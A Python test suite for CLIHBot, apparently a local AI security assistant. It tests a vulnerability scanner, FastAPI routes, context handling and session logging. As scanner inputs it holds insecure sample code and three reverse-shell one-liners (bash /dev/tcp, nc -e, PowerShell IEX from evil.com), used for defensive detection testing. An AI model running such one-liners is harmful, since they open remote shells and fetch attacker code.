"""
CLIHBot full subsystem test.
Run: python test_all.py
"""
from __future__ import annotations

import asyncio
import sys
import textwrap
import traceback
from pathlib import Path

PASS = "[PASS]"
FAIL = "[FAIL]"

results: list[tuple[str, str, str]] = []


def test(name: str, fn):
    try:
        fn()
        results.append((PASS, name, ""))
    except Exception:
        results.append((FAIL, name, traceback.format_exc().strip().splitlines()[-1]))


async def atest(name: str, coro):
    try:
        await coro
        results.append((PASS, name, ""))
    except Exception:
        results.append((FAIL, name, traceback.format_exc().strip().splitlines()[-1]))


# ══════════════════════════════════════════════════════════════════════════════
# 1. Config
# ══════════════════════════════════════════════════════════════════════════════

def t_config():
    from config import get_settings
    s = get_settings()
    assert s.context_window_tokens == 55_000
    assert s.available_token_budget == 55_000 - 4_096
    resolved = s.resolved_terminal_log
    assert "sessions" in resolved or "clihbot" in resolved, f"Unexpected default: {resolved}"
    assert s.sessions_dir.name == "sessions"

test("Config: settings load + smart defaults", t_config)


# ══════════════════════════════════════════════════════════════════════════════
# 2. Security patterns structure
# ══════════════════════════════════════════════════════════════════════════════

def t_patterns():
    import re
    from prompts.security_patterns import PATTERNS
    assert len(PATTERNS) >= 30, f"Only {len(PATTERNS)} patterns defined"
    for p in PATTERNS:
        assert "id" in p and "regex" in p and "severity" in p, f"Malformed pattern: {p.get('id')}"
        assert isinstance(p["regex"], re.Pattern), f"regex not compiled for {p['id']}"
        assert p["severity"] in ("critical", "high", "medium", "low"), f"Bad severity in {p['id']}"

test("Security patterns: structure validated for all patterns", t_patterns)


# ══════════════════════════════════════════════════════════════════════════════
# 3. Code scanner — multi-class detection
# ══════════════════════════════════════════════════════════════════════════════

def t_scanner_multi():
    from tools.code_scanner import scan_code_sync
    code = textwrap.dedent("""\
        password = "hunter2"
        import pickle
        data = pickle.loads(raw)
        os.system(user_input)
        eval(expr)
        q = "SELECT * FROM t WHERE id = " + uid
    """)
    findings = scan_code_sync(code, "test.py")
    ids = {f["id"] for f in findings}
    assert "hardcoded_password" in ids,  f"Missing hardcoded_password — got: {ids}"
    assert "python_pickle_load" in ids,  f"Missing python_pickle_load — got: {ids}"
    assert "os_system_call"     in ids,  f"Missing os_system_call — got: {ids}"
    assert "eval_exec_call"     in ids,  f"Missing eval_exec_call — got: {ids}"
    assert "sql_string_format"  in ids,  f"Missing sql_string_format — got: {ids}"

test("Code scanner: detects 5 distinct vulnerability classes", t_scanner_multi)


def t_scanner_clean():
    from tools.code_scanner import scan_code_sync
    findings = scan_code_sync("def add(a, b): return a + b", "clean.py")
    assert findings == [], f"False positives on clean code: {findings}"

test("Code scanner: no false positives on clean code", t_scanner_clean)


def t_scanner_severity_order():
    from tools.code_scanner import scan_code_sync
    code = 'password = "abc123"\nos.system(x)'
    findings = scan_code_sync(code, "f.py")
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    vals = [order[f["severity"]] for f in findings]
    assert vals == sorted(vals), f"Findings not sorted by severity: {[f['severity'] for f in findings]}"

test("Code scanner: findings sorted critical → low", t_scanner_severity_order)


def t_scanner_xss():
    from tools.code_scanner import scan_code_sync
    code = textwrap.dedent("""\
        element.innerHTML = userInput;
        autoescape = False
    """)
    findings = scan_code_sync(code, "app.js")
    ids = {f["id"] for f in findings}
    assert "innerHTML_assignment"   in ids, f"Missing innerHTML_assignment — got: {ids}"
    assert "jinja2_autoescape_off"  in ids, f"Missing jinja2_autoescape_off — got: {ids}"

test("Code scanner: XSS patterns detected", t_scanner_xss)


def t_scanner_revshell():
    from tools.code_scanner import scan_code_sync
    shells = [
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "nc -e /bin/sh 10.0.0.1 4444",
        'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/rev.ps1")',
    ]
    for shell in shells:
        findings = scan_code_sync(shell, "test.sh")
        crits = [f for f in findings if f["severity"] == "critical"]
        assert crits, f"No critical finding for reverse shell: {shell!r}"

test("Code scanner: reverse shell one-liners flagged critical", t_scanner_revshell)


def t_scanner_crypto():
    from tools.code_scanner import scan_code_sync
    code = textwrap.dedent("""\
        verify = False
        md5_hash_password = hashlib.md5(pw).hexdigest()
        iv = b"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07"
    """)
    findings = scan_code_sync(code, "crypto.py")
    ids = {f["id"] for f in findings}
    assert "ssl_verify_false"    in ids, f"Missing ssl_verify_false — got: {ids}"
    assert "weak_hash_md5_sha1"  in ids, f"Missing weak_hash_md5_sha1 — got: {ids}"

test("Code scanner: crypto weakness patterns detected", t_scanner_crypto)


def t_scanner_format_output():
    from tools.code_scanner import scan_code_sync, _format_result
    code = 'password = "secret123"\nos.system(cmd)'
    raw = scan_code_sync(code, "f.py")
    result = _format_result(raw, "f.py")
    assert "findings" in result
    assert "total" in result
    assert "alerts" in result
    assert "summary" in result
    assert result["total"] == len(raw)
    assert "issue" in result["summary"]

test("Code scanner: formatted result structure correct", t_scanner_format_output)


# ══════════════════════════════════════════════════════════════════════════════
# 4. System prompt
# ══════════════════════════════════════════════════════════════════════════════

def t_sysprompt_basic():
    from core.context_manager import count_tokens
    from prompts.system_prompt import build_system_prompt
    prompt = build_system_prompt()
    assert "CLIHBot" in prompt
    assert "cybersecurity" in prompt.lower()
    assert count_tokens(prompt) < 3_000, f"System prompt too large: {count_tokens(prompt)} tokens"

test("System prompt: content + token budget check", t_sysprompt_basic)


def t_sysprompt_with_context():
    from prompts.system_prompt import build_system_prompt
    prompt = build_system_prompt({
        "browser_url": "https://example.com",
        "terminal_lines": ["whoami", "root"],
        "scan_alerts": [
            {"severity": "critical", "id": "eval_exec_call", "line": 5, "explanation": "eval used"}
        ],
    })
    assert "example.com"    in prompt
    assert "whoami"         in prompt
    assert "eval_exec_call" in prompt

test("System prompt: context snapshot injected correctly", t_sysprompt_with_context)


# ══════════════════════════════════════════════════════════════════════════════
# 5. Context manager
# ══════════════════════════════════════════════════════════════════════════════

def t_token_counting():
    from core.context_manager import count_tokens
    assert count_tokens("hello world") >= 2
    assert count_tokens("") <= 1

test("Context manager: token counting", t_token_counting)


def t_truncation():
    from core.context_manager import ContextManager
    cm = ContextManager()
    big = "x" * 200_000
    result = cm.truncate_tool_result(big, "test_tool")
    assert len(result) < len(big),  "Truncation did not reduce size"
    assert "TRUNCATED" in result,   "Truncation notice missing"

test("Context manager: large tool result truncated with notice", t_truncation)


async def t_context_build():
    from core.context_manager import ContextManager
    from prompts.system_prompt import build_system_prompt
    cm = ContextManager()
    cm.add({"role": "user",      "content": "Hello agent"})
    cm.add({"role": "assistant", "content": "Hello! How can I help?"})
    msgs = await cm.build_messages(build_system_prompt())
    assert msgs[0]["role"] == "system"
    assert any(m["content"] == "Hello agent" for m in msgs)
    assert cm.history_token_count() > 0


# ══════════════════════════════════════════════════════════════════════════════
# 6. FastAPI app
# ══════════════════════════════════════════════════════════════════════════════

def t_fastapi_routes():
    from api.server import create_app
    from fastapi import FastAPI
    app = create_app()
    assert isinstance(app, FastAPI)
    paths = {r.path for r in app.routes}
    for expected in ["/chat", "/health", "/scan", "/context/screen",
                     "/context/terminal", "/context/browser", "/history"]:
        assert expected in paths, f"Route {expected!r} missing — got: {paths}"

test("FastAPI: all expected routes present", t_fastapi_routes)


async def t_fastapi_health_response():
    from httpx import AsyncClient, ASGITransport
    from api.server import create_app
    app = create_app()
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        resp = await client.get("/health")
    assert resp.status_code == 200
    data = resp.json()
    assert "status" in data
    assert "lmstudio_reachable" in data
    assert data["context_window_tokens"] == 55_000


async def t_fastapi_scan_endpoint():
    from httpx import AsyncClient, ASGITransport
    from api.server import create_app
    app = create_app()
    payload = {"content": 'password = "abc123"', "filename": "test.py"}
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        resp = await client.post("/scan", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert "findings" in data
    assert data["total"] >= 1

async def t_fastapi_terminal_endpoint():
    from httpx import AsyncClient, ASGITransport
    from api.server import create_app
    from tools.terminal_watcher import _ring_buffer, _append_lines
    _ring_buffer.clear()
    _append_lines("test line from terminal")
    app = create_app()
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        resp = await client.get("/context/terminal?lines=10")
    assert resp.status_code == 200
    data = resp.json()
    assert "lines" in data
    assert any("test line from terminal" in l for l in data["lines"])

async def t_fastapi_clear_history():
    from httpx import AsyncClient, ASGITransport
    from api.server import create_app
    app = create_app()
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        resp = await client.delete("/history")
    assert resp.status_code == 200
    assert resp.json()["status"] == "cleared"


# ══════════════════════════════════════════════════════════════════════════════
# 7. File reader
# ══════════════════════════════════════════════════════════════════════════════

async def t_file_read_basic():
    from tools.file_reader import read_file
    result = await read_file(str(Path(__file__)))
    assert "error" not in result
    assert result["total_lines"] > 50
    assert "CLIHBot" in result["content"]

async def t_file_read_range():
    from tools.file_reader import read_file
    result = await read_file(str(Path(__file__)), start_line=1, end_line=5)
    assert result["returned_lines"] == "1-5"
    assert len(result["content"].splitlines()) == 5

async def t_file_read_not_found():
    from tools.file_reader import read_file
    result = await read_file("totally_missing_file.xyz")
    assert "error" in result

async def t_file_search():
    from tools.file_reader import search_files
    result = await search_files("*.py", str(Path.cwd()))
    assert result["count"] >= 5
    names = [Path(m).stem for m in result["matches"]]
    assert "session" in names
    assert "config"  in names

async def t_file_autoscan():
    from tools.file_reader import read_file
    import tempfile, os
    # Write a temp Python file with a security issue
    tmp = Path(tempfile.gettempdir()) / "clihbot_test_autoscan.py"
    tmp.write_text('password = "exposed_secret"\n')
    try:
        result = await read_file(str(tmp))
        assert "security_findings" in result, "Auto-scan did not run on .py file"
        ids = {f["id"] for f in result["security_findings"]}
        assert "hardcoded_password" in ids
    finally:
        tmp.unlink(missing_ok=True)


# ══════════════════════════════════════════════════════════════════════════════
# 8. Session launcher
# ══════════════════════════════════════════════════════════════════════════════

def t_session_name_format():
    import re
    from session import ADJECTIVES, NOUNS, generate_session_name
    for _ in range(20):
        name = generate_session_name()
        assert re.match(r"^[a-z]+-[a-z]+-\d{8}-\d{6}$", name), f"Bad format: {name}"
        parts = name.split("-")
        assert parts[0] in ADJECTIVES, f"{parts[0]!r} not in ADJECTIVES"
        assert parts[1] in NOUNS,      f"{parts[1]!r} not in NOUNS"

test("Session launcher: name format + word bank membership (×20)", t_session_name_format)


def t_session_uniqueness():
    from session import generate_session_name
    import time
    names = set()
    for _ in range(50):
        names.add(generate_session_name())
    # All unique (timestamp ensures this unless the loop runs in <1s with same second,
    # but words add entropy too)
    assert len(names) >= 45, f"Too many collisions: only {len(names)} unique in 50"

test("Session launcher: names have high entropy (50 samples)", t_session_uniqueness)


def t_session_setup():
    from config import get_settings
    from session import generate_session_name, setup_session
    name = generate_session_name()
    log = setup_session(name)
    assert log.exists(),              "Log file not created"
    text = log.read_text()
    assert name      in text,         "Session name missing from header"
    assert "Started" in text,         "Timestamp missing from header"
    assert "Platform" in text,        "Platform info missing from header"
    ptr = get_settings().sessions_pointer
    assert ptr.exists(),              "Pointer file not created"
    assert ptr.read_text().strip() == str(log), "Pointer does not point to log"

test("Session launcher: log file created with header + pointer updated", t_session_setup)


# ══════════════════════════════════════════════════════════════════════════════
# 9. Terminal watcher ring buffer
# ══════════════════════════════════════════════════════════════════════════════

async def t_ring_buffer():
    from tools.terminal_watcher import _ring_buffer, _append_lines, get_terminal_buffer
    _ring_buffer.clear()
    _append_lines("alpha\nbeta\ngamma\ndelta")
    result = await get_terminal_buffer(lines=2)
    assert result["count"] == 2
    assert result["lines"] == ["gamma", "delta"]
    assert result["total_buffered"] == 4

async def t_ring_buffer_session_field():
    from tools import _REGISTRY
    # Reset registry to pick up current state
    from tools.terminal_watcher import _ring_buffer, _append_lines, _active_session, get_terminal_buffer
    _ring_buffer.clear()
    _append_lines("some output")
    _active_session["name"] = "brave-hex-20260218-123456"
    _active_session["log_path"] = "/tmp/test.log"
    result = await get_terminal_buffer()
    assert result.get("session") == "brave-hex-20260218-123456"
    assert "log_path" in result


# ══════════════════════════════════════════════════════════════════════════════
# 10. Tool registry completeness
# ══════════════════════════════════════════════════════════════════════════════

def t_registry():
    from tools import TOOL_SCHEMAS, get_tool_registry
    assert len(TOOL_SCHEMAS) == 8
    registry = get_tool_registry()
    for schema in TOOL_SCHEMAS:
        name = schema["function"]["name"]
        assert name in registry,    f"Schema tool {name!r} has no registry entry"
        assert callable(registry[name]), f"Registry entry for {name!r} is not callable"
        # Every schema has required fields
        fn = schema["function"]
        assert "description" in fn,   f"Tool {name!r} missing description"
        assert "parameters"  in fn,   f"Tool {name!r} missing parameters"

test("Tool registry: all 8 schemas have matching callable handlers", t_registry)


# ══════════════════════════════════════════════════════════════════════════════
# Runner
# ══════════════════════════════════════════════════════════════════════════════

async def run_async():
    await atest("Context manager: builds message list correctly",         t_context_build())
    await atest("FastAPI: /health returns correct structure",             t_fastapi_health_response())
    await atest("FastAPI: /scan detects hardcoded password",              t_fastapi_scan_endpoint())
    await atest("FastAPI: /context/terminal returns ring buffer",         t_fastapi_terminal_endpoint())
    await atest("FastAPI: DELETE /history returns cleared",               t_fastapi_clear_history())
    await atest("File reader: basic read of this test file",              t_file_read_basic())
    await atest("File reader: line range (1-5)",                          t_file_read_range())
    await atest("File reader: missing file returns error dict",           t_file_read_not_found())
    await atest("File reader: search finds session.py and config.py",     t_file_search())
    await atest("File reader: auto-scan triggers on .py with vuln",       t_file_autoscan())
    await atest("Terminal watcher: ring buffer lines + limit",            t_ring_buffer())
    await atest("Terminal watcher: session name exposed in buffer result", t_ring_buffer_session_field())

asyncio.run(run_async())


# ══════════════════════════════════════════════════════════════════════════════
# Report
# ══════════════════════════════════════════════════════════════════════════════

print()
print("=" * 65)
passes = [r for r in results if r[0] == PASS]
fails  = [r for r in results if r[0] == FAIL]
for status, name, detail in results:
    print(f"  {status}  {name}")
    if detail:
        print(f"           >> {detail[:100]}")
print("=" * 65)
print(f"  {len(passes)}/{len(results)} passed    {len(fails)} failed")
print()
sys.exit(1 if fails else 0)
